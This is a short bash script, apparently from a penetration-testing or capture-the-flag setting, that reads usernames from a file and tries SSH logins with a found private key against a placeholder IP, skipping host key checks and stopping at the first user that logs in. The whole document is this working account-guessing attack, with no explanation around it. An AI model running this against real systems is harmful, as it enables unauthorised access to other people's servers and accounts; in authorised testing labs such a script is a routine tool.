ip=x.x.x.x

while read -r user; do
        echo "Trying user: $user"
        ssh -o BatchMode=yes -o StrictHostKeyChecking=no -i id_rsa $user@$ip "exit" 2>/dev/null
        if [ $? -eq 0 ]; then
                echo "Login successful for user: $user"
                break
        fi
done < users.txt
